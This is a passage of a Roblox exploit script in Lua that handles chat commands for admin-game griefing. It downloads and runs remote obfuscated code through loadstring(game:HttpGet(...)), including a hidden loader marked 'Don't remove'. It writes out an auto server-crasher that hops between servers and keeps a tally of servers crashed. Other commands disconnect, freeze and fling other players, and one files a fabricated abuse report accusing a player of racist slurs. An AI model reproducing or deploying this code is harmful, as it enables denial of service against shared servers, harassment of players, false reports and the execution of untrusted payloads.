				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
				chatt("refresh all");wait()
				chatt("/regpiss")
			end

			if msg:lower() == prefix .. "ap" then
				game.Players.LocalPlayer.CharacterAdded:connect(function()
					regen()
				end)
			end
			if msg:lower() == prefix .. "bmove" then
				print("Omg real working btools")
				logn("bmove Lite loaded")
				if shared.__Dispose ~= nil then
					shared.__Dispose()
					shared.__Dispose = nil
				end
				local exit = false
				local connections = {}
				shared.__Dispose = function()
					for i, c in ipairs(connections) do
						c:Disconnect()
					end
					exit = true
				end

				--//     Services     //--
				local plyrs = game:GetService("Players")
				local ws = game:GetService("Workspace")
				local rns = game:GetService("RunService")

				--//     Tables     //--
				local Nav = {
					target,
					held = false,
					ut
				}

				--//     Variables     //--
				local lp = plyrs.LocalPlayer
				local mouse = lp:GetMouse()

				--//     Functions     //--
				local ivorysc = game:HttpGet("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20(99).lua")
				local IvoryMovePart = nil -- my fancy move library
				local function MovePart(t, p)
					--t.CFrame = p
					IvoryMovePart = loadstring(ivorysc, true)()
					IvoryMovePart(t, p, true)
					IvoryMovePart = nil
					workspace.Gravity = 191
				end
				local function FloorVec(v)
					return Vector3.new(math.floor(v.X), math.floor(v.Y), math.floor(v.Z))
				end

				--//     Code     //--
				table.insert(connections, mouse.Button1Down:Connect(function() -- get
					if mouse.Target then
						Nav.ut = mouse.Target
						Nav.target = Nav.ut:Clone()
						Nav.target.Parent = ws
						Nav.target.CanCollide = false
						Nav.target.Transparency = 0.6
						mouse.TargetFilter = Nav.target
						Nav.held = true
					end
				end))
				table.insert(connections, rns.RenderStepped:Connect(function() -- client move
					if Nav.held and Nav.target then
						local pos = ws.Camera.CFrame.Position + (mouse.UnitRay.Direction * 30)
						Nav.target.Position = FloorVec(pos)
					end
				end))
				table.insert(connections, mouse.Button1Up:Connect(function() -- finish & mov
					Nav.target:Destroy()
					MovePart(Nav.ut, Nav.target.CFrame)
					mouse.TargetFilter = nil
					Nav.held = false
					Nav.target = nil
					Nav.ut = nil
				end))
				repeat
					wait()
				until exit
				return
			end

			--wait(.5)
			--loadstring(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua'),true))()

			-- cmd/ID Hider "..antilog.."
			if msg:lower() == prefix .. "fixgrav" then
				workspace.Gravity = 196.2
			end
			if msg:lower() == prefix .. "bdel" then
				task.wait(.65)
				chatt("/clicktpiss");wait(.25)
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua"),
						true
					)
				)() ;wait(.35)
				chatt("nil")
				execCmd("float")
				execCmd("infjump")
			end
			if msg:lower() == prefix .. "brockenhammer" then
				execCmd("partpath")
				workspace.Gravity = 196.2 ;wait(4.5)
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/SCtestv4r14nt/scr4bl33/main/BrockenHammer'), true))()
			end
			if msg:lower() == prefix .. "kbmove" then
				chatt(prefix.."savebuildstuff");wait(.65)
				chatt("gear me "..antilog.."18474459");wait()
				chatt("gear me "..antilog.."79446473");wait(.65)
				chatt(prefix.."bdel")
				chatt(prefix.."brockenhammer")
				--//     Sussy Script     //--
				if shared.__Dispose ~= nil then
					shared.__Dispose()
					shared.__Dispose = nil
				end
				local exit = false
				local connections = {}
				shared.__Dispose = function()
					for i, c in ipairs(connections) do
						c:Disconnect()
					end
					exit = true
				end
				local Tools = loadstring(game:HttpGet("https://pastebin.com/raw/Yk4rG8Mb", true))()
				moveScript = game:HttpGet("https://pastebin.com/raw/vycCFpbn")

				--//     Create tools     //--
				Tools:MakeTool(
					"Move",
					function()
						loadstring(moveScript)()
					end,
					function()
						shared.__Dispose()
						for i, v in pairs(workspace:GetChildren()) do
							if v.Name == "PhantomPart" then
								v:Destroy()
							end
						end
						workspace.Gravity = 198.1
					end)
				repeat
					wait()
				until exit
				return
			end

			--wait(.5)
			--loadstring(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua'),true))()

			-- cmd/ID Hider "..antilog.."

			if msg:lower() == prefix .. "autocrash" then
				writefile("Orion open source autocrasher.lua", [[

local loopnum = "99999999999999999999999999999999"
local antilog = "00000000000000000000000000000000"

wait(1.5) 
local settings = {
    musicid = ""
}
function loadsettings()
    if not isfile("orion settings.json") then
        rconsoleerr("Settings File Not Found! Redirecting To Settings Saver...")
        savesettings()
    else
        local http = game:GetService("HttpService")
        settings = http:JSONDecode(readfile("orion settings.json"))
    end
end
function savesettings()
    local http = game:GetService("HttpService")
    rconsoleprint("\n Enter Music Id: ")
    local id = rconsoleinput()
    local settings = {
        musicid = id
    }
    local json = http:JSONEncode(settings)
    writefile("orion settings.json", json)
    rconsoleprint("\n Settings Saved Please Rejoin To Start Crashing!")
    return rconsoleprint("\n Settings Saved Please Rejoin To Start Crashing!")
end
loadsettings()
function say(i) game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(i, "ALL") end
local textbox = Instance.new("TextBox", workspace)

local function cmd(massage)
    textbox:SetTextFromInput(massage)
    game.Players:Chat(massage)
end
-- re function
local crashfile = isfile("NBC Servers Crashed.txt")
if crashfile == false then
    writefile("NBC Servers Crashed.txt", "NBC Crash File")
end
local bccrashfile = isfile("BC Servers Crashed.txt")
if bccrashfile == false then
    writefile("BC Servers Crashed.txt", "BC Crash File")
end

local countfile = isfile("AmmountCrashed.txt")
if countfile == false then
    writefile("AmmountCrashed.txt", "0")
end
local bccountfile = isfile("BC AmmountCrashed.txt")
if bccountfile == false then
    writefile("BC AmmountCrashed.txt", "0")
end

function updatename()
    spawn(function()
    local nbccrash = readfile("AmmountCrashed.txt")
    local bccrash = readfile("BC AmmountCrashed.txt")
    rconsolename("Orion v9.0 NBC Servers Crashed: " ..nbccrash.. " | BC Servers Crashed: " ..bccrash)
    end)
end
updatename()
--new function
local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}

local data
if not isfile('cs.json') then
    writefile('cs.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('cs.json'))
end
if not data then
    warn('Fatal error')
    return
end
function updateFile()
    local suc,er = pcall(function()
        writefile('cs.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
updateFile()

-- Don't remove unless you have perm.
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Ignore%20this%20loadstring%202.lua",true))()
end)

function serverhop()
    while wait() do
        pcall(function()
            local x = {}
            for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100")).data) do
                local check = true
                for _,v2 in pairs(data) do
                    if v2 == v.id then
                        check = false
                    end
                end
                if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId and check then
                    x[#x + 1] = v.id
                    amount = v.playing
                end
            end
            if #x > 0 then
                wait(0.25)
                game:GetService("TeleportService"):TeleportToPlaceInstance("112420803", x[math.random(1, #x)])
            end
            if #x == 0 then
                rconsoleprint("\n\nNo server found trying BC version")
                bchop()
            end
        end)
    end
end

local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}

local data
if not isfile('bc.json') then
    writefile('bc.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('bc.json'))
end
if not data then
    warn('Fatal error')
    return
end
function bcfile()
    local suc,er = pcall(function()
        writefile('bc.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
bcfile()

function bchop()
    while wait() do
        pcall(function()
            local x = {}
            for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/115670532/servers/Public?sortOrder=Asc&limit=100")).data) do
                local check = true
                for _,v2 in pairs(data) do
                    if v2 == v.id then
                        check = false
                    end
                end
                if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId and check then
                    x[#x + 1] = v.id
                    amount = v.playing
                end
            end
            if #x > 0 then
                wait(0.25)
                game:GetService("TeleportService"):TeleportToPlaceInstance("115670532", x[math.random(1, #x)])
            end
            if #x == 0 then
                rconsoleprint("\n\nNo server found trying NBC version")
                    serverhop()
            end
        end)
    end
end
function changeserver()
    serverhop()
end
repeat task.wait() until game:IsLoaded()
wait(2)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
local regen = game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen")
local gpad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin")
if not regen and not gpad then
    changeserver()
    wait(999)
end
if regen then
    fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0) 
end
if game.Players.LocalPlayer.Character.Head then
local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()
		for i, pad in pairs(pads) do
			Spawn(function()
				local cre = pad.Head
				local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
			    firetouchinterest(cre, spr, 1)
				wait()
				firetouchinterest(cre, spr, 0)
			end)
		end
    else
        changeserver()
    end
local whitelisttoggle = true
local whitelisted = {}
if whitelisttoggle == true then
    for i,v in pairs(whitelisted) do
        if game.Players:FindFirstChild(v) then
            --cmd("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Whitelisted Player Found " ..v.. "\n Buy Orion Today \n .gg/C_N__D3_yq__qj")
            changeserver()
            return rconsoleerr("\n"..v.. " Is In Game Skipping...")
        end
    end
end
-- Command Varibles
say("//v3disconnect all")
wait(.35)
cmd("music " ..settings.musicid)
cmd("time 0")
cmd("fogcolor 0 0 0")
cmd("fogend 0")
--cmd("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Crash testing. Soon crashing like this may be obsolete")
cmd("gear me "..antilog.."94794847")
task.wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 1500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))

wait(.35)

local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
for _, v in ipairs(Backpack:GetChildren()) do
    v.Parent = game.Players.LocalPlayer.Character
    v:Activate()
end

wait(.35)
for i = 1, 9 do
    cmd("unsize me me me");task.wait()
end
local antibanfunction = false
wait(0.5)
spawn(function()
    while antibanfunction == false do task.wait()
        for i = 1,3 do cmd("size all 0.3") end
        cmd("freeze all")
        for i = 1,3 do cmd("size all 10") end
        cmd("clone all")
    end
end)
wait(5)
updatename()
antibanfunction = true
rconsoleprint("@@GREEN@@")
rconsoleprint("\n\nServer Crashed!")
rconsoleprint("\n\n\n\n")
spawn(function()
local plrcount = 0 -- Define the number at first.

for i,v in pairs(game.Players:GetChildren()) do
if v:IsA("Player") then -- Check if it's a player.
        plrcount = plrcount+1 -- Update the player count.
    end
end
local id = game.JobId
rconsoleprint(id.. " Crashed With " ..plrcount.. " People")
if game.PlaceId == 112420803 then
    local ammount = readfile("AmmountCrashed.txt")
    writefile("AmmountCrashed.txt", ammount+1)
    appendfile("NBC Servers Crashed.txt", "\n " ..id.. " | " ..plrcount.. " Playing")
else
    if game.PlaceId == 115670532 then
        appendfile("BC Servers Crashed.txt", "\n " ..id.. " | " ..plrcount.. " Playing")
        local ammount = readfile("BC AmmountCrashed.txt")
        writefile("BC AmmountCrashed.txt", ammount+1)
    end
end
local nbccrash = readfile("AmmountCrashed.txt")
local bccrash = readfile("BC AmmountCrashed.txt")
rconsoleprint("\n NBC: " ..nbccrash.. " | BC: " ..bccrash)
end)

changeserver()]])
			end


			if msg:lower() == prefix .. "antigearon" then
				chatt("/toggle anticrashvg on")
				antigear = true
				for i, v in pairs(game.Players:GetPlayers()) do
					if #v.Backpack:GetChildren() > 0 then
						chatt("blind "..v.Name)
						chatt("size "..v.Name.." nan");task.wait()
						chatt("freeze "..v.Name)
						chatt("name "..v.Name)
					end
				end
			end
			if msg:lower() == prefix .. "antigearoff" then
				chatt("/toggle anticrashvg off")
				antigear = false
			end

			if msg:lower() == prefix .. "serverhop" or msg:lower() == prefix .. "coolshop" or msg:lower() == prefix .. "shop" then
				chatt("/rrej") -- From SCV1
			end

			if msg:lower() == prefix .. "v3disconnect others" or msg:lower() == prefix .. "fastv3dc others" or msg:lower() == prefix .. "v3disconnect all" then
				for i = 1, 4 do
					chatt("gear others "..antilog.."25741198")
				end;task.wait()
				chatt("gear others "..antilog.."55028088")
				chatt("blind others")
				chatt("pm/others Kicked by SC \n Don't abuse next time.")
				chatt("time -")
				chatt("fogcolor 0 0 0")
				chatt("brightness nan")
				chatt("fogend nil");wait(.5)
				game.Players:Chat(prefix.."silcrash");wait(5)
				for i = 1, 6 do
					execCmd("unloopgoto");wait(1)
				end
			end

			if msg:lower() == prefix .. "test" then
				pass()
			end

			if msg:lower() == prefix .. "randomtheme" then
				chatt("fix ing the theme")
				local fmusic = math.random(1, 10)
				if fmusic == 1 then
					chatt("music "..antilog.."1843403232")
				elseif fmusic == 2 then
					chatt("music "..antilog.."1838028467");wait()
					chatt("time -")
				elseif fmusic == 3 then
					chatt("music "..antilog.."1840040963");wait()
					chatt("colorshifttop 600 400 10")
					chatt("colorshiftbottom 600 400 10")
					chatt("time 16")
					wait(1)
				elseif fmusic == 4 then
					chatt("music "..antilog.."5410085763");wait()
					chatt(("outdoorambient 255 255 255"))
					chatt(("fogend 2000"))
					chatt(("time 7"))
					chatt("h/ TIME TO DANCE!!!!")
					wait(1)
				elseif fmusic == 5 then
					chatt("music "..antilog.."9048375035");wait()
					chatt(("fogcolor 250 0 500"))
					chatt(("fogend 100"))
					wait(1)
				elseif fmusic == 6 then
					chatt("music "..antilog.."1846368080");wait()
					chatt(("fogcolor 250 0 500"))
					chatt(("fogend 1000"))
					wait(1)
				elseif fmusic == 7 then
					chatt("music "..antilog.."6823597327");wait()
					chatt("time 14")
					chatt(("fogcolor -300, -300, -300"))
					chatt(("fogend 360"))
					chatt("nograv all")
					chatt("speed all 19")
					wait(1)
				elseif fmusic == 8 then
					chatt("music "..antilog.."5410086218");wait()
					chatt("time -")
					chatt(("fogcolor 255, 215, 0"))
					chatt(("fogend 320"))
					chatt("speed all 19")
					wait(1)
				elseif fmusic == 9 then
					chatt("music "..antilog.."1847105373");wait()
					chatt(("outdoorambient 0 0 0"))
					chatt("time -")
					chatt(("fogcolor 0 0 0"))
					chatt(("fogend 250"))
					chatt("speed all 8")
					wait(1)
				elseif fmusic == 10 then
					chatt("music "..antilog.."1835924107");wait()
					chatt(("fogend 2000"))
					chatt(("time 8"))
					wait(1)
				end
			end

			if msg:lower() == prefix .. "antikick" then
				shared.antikick = true
				while shared.antikick == true do task.wait()
					game.Players.LocalPlayer.Character:Destroy()
				end
			end

			if msg:lower() == prefix .. "freezesize" then
				chatt("part/4/7/4")
			end

			if msg:lower() == prefix .. "anchorpart" then
				execCmd("freezeua");wait(.35)
				execCmd("freezeunanchored")
				longlogn("You now have partownership. Get too far from the object and you lose control")

			end

			if msg:lower() == prefix .. "doublecounter" then
				if doubleglobal == true then
					chatt("h \n\n\n Double Counter Firewall: You know I'm already active right? Now what else do you want from me.\n\n\n")
					chatt("blind me")
					chatt("name me Attention seeker")
					chatt("trip me")
					return
				end
				pcall(function()
					getgenv().doubleglobal = true
				end)
				local plrs = game:GetService'Players'
				plrs.PlayerAdded:Connect(function(plyr)
					if plyr.AccountAge < 21 then
						repeat
							task.wait()
						until plyr.Character
						chatt("blind "..plyr.Name)
						chatt("punish "..plyr.Name);wait(.1)
						local dc = math.random(1, 7)
						if dc == 1 then
							chatt("h \n\n\n Double Counter Firewall: Account too young? No joining for you.\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: Account too young? No joining for you.\n\n\n")
							chatt("part/10/10/10");wait(.35)
							chatt("/clearlogs")
						elseif dc == 2 then
							chatt("h \n\n\n Double Counter Firewall: VPNs, I mean alts are not allowed\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: VPNs, I mean alts are not allowed\n\n\n")
						elseif dc == 3 then
							chatt("h \n\n\n Double Counter Firewall: YOU SHALL NOT PASS!!!")
							chatt("h/ \n\n\n Double Counter Firewall: YOU SHALL NOT PASS!!!\n\n\n You stand no chance on that alt lol")
						elseif dc == 4 then
							chatt("h \n\n\n Double Counter Firewall: I'm a really friendly guard. But I don't like new accounts. Get outta here\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: I'm a really friendly guard. But I don't like new accounts. Get outta here\n\n\n")
						elseif dc == 5 then
							chatt("h \n\n\n Double Counter Firewall: Stop calling me unofficial. I'M TOO COOL TO BE UNOFFICIAL. Also stop using alts\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: Stop calling me unofficial. I'M TOO COOL TO BE UNOFFICIAL. Also stop using alts\n\n\n")
						elseif dc == 6 then
							chatt("h \n\n\n Double Counter Firewall: Those alts failing to join remind me of Unspoken and Temmie failing to cancel us\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: Those alts failing to join remind me of Unspoken and Temmie failing to cancel us\n\n\n")
							chatt("m/On god bro this message")
						elseif dc == 7 then
							chatt("h \n\n\n Double Counter Firewall: My name is Double Counter but I don't even know how to count... :thinking:\n\n\n")
							chatt("h/ \n\n\n Double Counter Firewall: My name is Double Counter but I don't even know how to count... :thinking:\n\n\n")
							chatt("m/ 1 2 3")
						end
						chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ----------------------------------------\n\n\n DOUBLE COUNTER \n\n New accounts will automatically be server banned. \n Security first;) \n\n\n----------------------------------------")
						chatt("pm/"..plyr.Name.." \n\n\n\n\n\n\n\n\n\n\n\n\n\nYour account is too young. Either join on a newer account or get older lol. \n It's not hard to be a strong old man. \nAlso girls don't exist\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
						chatt("pm "..plyr.Name.." Your account is too young. Therefore we cannot let you join.");wait(1.5)
						game.Players:Chat("_bn "..plyr.Name)
					end
				end)
			end

			if msg:lower() == prefix .. "hairdryer others" or msg:lower() == prefix .. "hairdryer all" then
				chatt("gear others "..antilog.."55028088")
				chatt("setgrav others -9e9")
			end

			if msg:lower() == prefix .. "autorejoin" then
				if autorjglobal == true then
					pass()
					return
				end
				pcall(function()
					getgenv().autorjglobal = true
				end)
				longlogn("You'll now automatically rejoin every set amount of time")
				wait(100)
				longlogn("10 minutes until you get auto-rejoined")
				wait(290)
				longlogn("5 minutes until you get auto-rejoined")
				wait(230)
				longlogn("Auto rejoining in about a minute")
				wait(60)
				rejoin()
			end

			if msg:lower() == prefix .. "findcarpet" then
				game.Players:Chat("/pads");wait()
				chatt("skydive me me me me Also did you know that 3 is the maximum amount of targets that you can list and not more.")
			end

			if msg:lower() == prefix .. "lagtable" then
				chatt(prefix.."infyield")
				chatt(prefix.."spam gear me "..antilog.."243788010")
				chatt("<spam gear me "..antilog.."243788010");wait(30)
				chatt(prefix.."stop")
				execCmd("usetools 250 0.033")
				logn("Stopped giving lagtables")
			end

			if msg:lower() == prefix .. "filltube" then
				chatt(prefix.."infyield")
				chatt("unchar me");wait(.35)
				chatt(prefix.."idle");wait(3.5)
				chatt("ff me");wait(.65)
				chatt("clone me")
				execCmd("noclipcam")
				logn("Zoom all the way out or else you will lag A LOT")
				print("Having Vecko loaded may also be somewhat recommended for the spam")
				logn("Don't reset yourself and wait until the spam stops. You should notice that it automatically resets you")
				chatt(prefix.."spam part/8/-9e9/8")
				chatt("<spam part/8/-9e9/8");wait(65)
				chatt(prefix.."stop")
				chatt("reset me")
				chatt("tp me me me")
				chatt(":tp me me me")
				longlogn("Stopped spamming. The hole should be extremely laggy now")
			end

			if msg:lower() == prefix .. "chatcontrol" then
				loadstring(game:HttpGet(('https://pastebin.com/raw/dSyLsh7s'),true))()
			end

			if msg:lower() == prefix .. "bccheck" then
				local id = 64354
				local function addperm(plr)
					if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. plr.UserId .. "/items/GamePass/" .. id), id) then
						chatt(prefix.."v3disconnect "..plr.Name)
						longlogn(plr.Name.." bought perm in BC. Laugh at this loser")
						longlogn(plr.Name.." bought perm in BC. Laugh at this loser")
						task.wait(2)
						pcall(function()
							game.Players:ReportAbuse(game:GetService("Players"),plr.Name,"Cheating/Exploiting", "He used exploits to bypass the chat and said homophobic and racist slurs at me and my friend. Please do something")
						end)
					end
				end

				for _, v in next, game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name then
						addperm(v)
					end
				end
				game.Players.PlayerAdded:Connect(function(p)
					addperm(p)
				end)
			end

			if msg:lower() == prefix .. "antipermv2" then
				local id = 66254
				local function addperm(plr)
					if not string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. plr.UserId .. "/items/GamePass/" .. id), id) then
						game.Players:Chat(prefix.."psave " .. plr.Name)
						chatt("skydive " .. plr.Name)
					end
				end

				for _, v in next, game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name then
						addperm(v)
					end
				end
				game.Players.PlayerAdded:Connect(function(p)
					addperm(p)
				end)
			end

			if msg:lower() == prefix .. "griefmode" then
				local b={"example1.com/shit","example2.com/shit"}local c=http_request or request or HttpPost or syn and syn.request or http and http.request;webhookdetect=hookfunction(c,function(d)if d.Method and d.Method=="POST"and d.Url and not table.find(b,d.Url)then c{Url=d.Url,Method="DELETE"}d.Url=""end;return webhookdetect(d)end)
				chatt("h \n\n\n Server Message: Time to send Everyone Flying!!!! \n\n\n")
				wait(2.5)
				chatt(prefix.."tspam invis me " .. math.random(1, 1000))
				loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
				wait(8.5)
				chatt(prefix.."stop")
			end

			if msg:lower() == prefix .. "clearlogs" then
				chatt("/clearlogs") -- From SCV1
			end

			if msg:lower() == prefix .. "movedb" then
